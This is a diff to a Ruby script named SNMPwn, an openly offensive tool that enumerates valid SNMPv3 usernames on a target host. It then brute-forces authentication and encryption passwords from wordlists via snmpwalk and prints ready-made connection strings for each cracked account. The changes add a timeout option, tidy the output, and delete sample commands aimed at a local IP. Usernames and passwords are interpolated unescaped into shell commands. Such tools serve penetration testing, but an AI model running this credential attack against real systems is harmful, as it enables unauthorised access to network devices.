@@ -1,6 +1,6 @@
 #!/usr/bin/env ruby
 #SNMPwn
-#SNMPv3 User Enumeration and Password Attack Script
+#SNMPv3 User Enumeration and Password Attack Tool
 
 require 'tty-command'
 require 'trollop'
@@ -22,6 +22,7 @@ def arguments
         opt :auth, "SNMP Authentication and Encryption Type. Should be either: authnopriv, noauthnopriv or authpriv", :type => String
         opt :passlist, "Password list for attacks", :type => String
         opt :enclist, "Encryption Password List for AuthPriv types", :type => String
+        opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3
 
         if ARGV.empty?
           puts "Need Help? Try ./snmpwn --help".red.bold
@@ -40,15 +41,15 @@ def findusers(arg)
   userfile.each do |user|
     out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
       if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
-        puts "Username: #{user} is valid".green.bold
+        puts "Username: '#{user}' is valid".green.bold
         users << user
       elsif err =~ /authorizationError/i
-        puts "Username: #{user} is valid".green.bold
+        puts "Username: '#{user}' is valid".green.bold
         users << user
       elsif err =~ /snmpwalk: Unknown user name/i
-        puts "Username: #{user} is not configured on this host".red.bold
+        puts "Username: '#{user}' is not configured on this host".red.bold
+      end
     end
-  end
   puts "\nValid Users:".green.bold + "\n#{users.join("\n")}"
   users
 end
@@ -64,7 +65,7 @@ def attack(arg, users)
     out, err = cmd.run!("snmpwalk -u #{user} #{arg[:host]} iso.3.6.1.2.1.1.1.0")
       if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
         users.delete(user)
-        puts "#{user} can connect without a password".green.bold
+        puts "'#{user}' can connect without a password".green.bold
         puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} #{arg[:host]}".light_magenta
   end
 end
@@ -76,7 +77,7 @@ end
       out, err = cmd.run!("snmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authnopriv")
         if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
           users.delete(user)
-          puts "#{user} can connect with the password #{password}".green.bold
+          puts "'#{user}' can connect with the password '#{password}'".green.bold
           puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} -A #{password} #{arg[:host]} -v3 -l authnopriv".light_magenta
         end
       end
@@ -88,31 +89,21 @@ end
     passwords.each do |password|
       encryption_pass.each do |epass|
         if epass.length >= 8 && password.length >= 8
-        out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: 0.5)
+        out, err = cmd.run!("snmpwalk -u #{user} -A #{password} -X #{epass} #{arg[:host]} -v3 iso.3.6.1.2.1.1.1.0 -l authpriv", timeout: arg[:timeout])
           if out =~ /iso.3.6.1.2.1.1.1.0 = STRING:/i
             users.delete(user)
-            puts "#{user} can connect with the password #{password} and the encryption password #{epass} ".green.bold
+            puts "'#{user}' can connect with the password '#{password}' and the encryption password '#{epass}'".green.bold
             puts "To connect for a POC, use this string:\nsnmpwalk -u #{user} -A #{password} -X #{epass} #{arg[:host]} -v3 -l authpriv".light_magenta
           else
-            puts "#{user} cannot connect with the password #{password} and the encryption password #{epass} ".red.bold
+            puts "'#{user}' cannot connect with the password '#{password}' and the encryption password '#{epass}'".red.bold
           end
         end
       end
     end
   end
+  puts "Finished, please use this information and tool responsibly".green.bold
 end
 
 arg = arguments
 users = findusers(arg)
 attack(arg, users)
-
-
-
-
-#Commands:
-#No auth just username
-#snmpwalk -u user1 192.168.1.107 -v3 iso.3.6.1.2.1.1.1.0
-#Authentication and encryption
-#snmpwalk -u user2 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authpriv
-#Same again but this user was configured for RW - Is there a way to enumerate that?
-#snmpwalk -u user3 -A password 192.168.1.107 -X password -v3 iso.3.6.1.2.1.1.1.0 -l authPriv
